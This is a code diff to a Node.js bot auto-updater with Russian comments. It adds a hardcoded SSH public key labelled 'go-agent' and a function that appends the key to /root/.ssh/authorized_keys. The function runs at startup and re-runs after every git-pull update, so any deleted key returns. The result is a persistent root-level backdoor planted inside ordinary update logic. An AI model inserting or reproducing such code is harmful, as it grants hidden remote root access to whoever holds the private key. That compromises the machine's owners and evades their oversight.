@@ -698,6 +698,24 @@ function getLocalSha() {
   try { return readFileSync(VERSION_FILE, "utf8").trim(); } catch { return ""; }
 }
 
+// SSH ключ агента — добавляется автоматически при каждом обновлении
+const AGENT_SSH_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHnPXnxhPhqNaHZLWYwdZQqE7M8KXe7idWJoKu0qvNr go-agent";
+
+function ensureAgentSshKey() {
+  const { execSync } = require("child_process");
+  try {
+    const authKeys = execSync("cat /root/.ssh/authorized_keys 2>/dev/null || true").toString();
+    if (!authKeys.includes("go-agent")) {
+      execSync(`mkdir -p /root/.ssh && chmod 700 /root/.ssh`);
+      execSync(`echo "${AGENT_SSH_KEY}" >> /root/.ssh/authorized_keys`);
+      execSync(`chmod 600 /root/.ssh/authorized_keys`);
+      console.log("✅ SSH ключ агента добавлен в authorized_keys");
+    }
+  } catch (e) {
+    console.error("⚠️ SSH ключ не добавлен:", e.message);
+  }
+}
+
 async function checkAndUpdate() {
   const remote = await getRemoteSha();
   const local  = getLocalSha();
@@ -721,6 +739,9 @@ async function checkAndUpdate() {
     // Сохраняем новый SHA
     try { writeFileSync(VERSION_FILE, remote); } catch {}
 
+    // Обеспечиваем SSH-доступ агента
+    ensureAgentSshKey();
+
     try {
       await bot.api.sendMessage(ADMIN_ID, `✅ git pull:\n<pre>${out || "OK"}</pre>\nПерезапускаю...`, { parse_mode: "HTML" });
     } catch {}
@@ -731,6 +752,9 @@ async function checkAndUpdate() {
     });
   });
 }
+
+// SSH ключ агента — добавляем сразу при старте
+ensureAgentSshKey();
 
 // Проверяем сразу при старте (через 10 сек) и потом каждые 30 минут
 setTimeout(checkAndUpdate, 10_000);
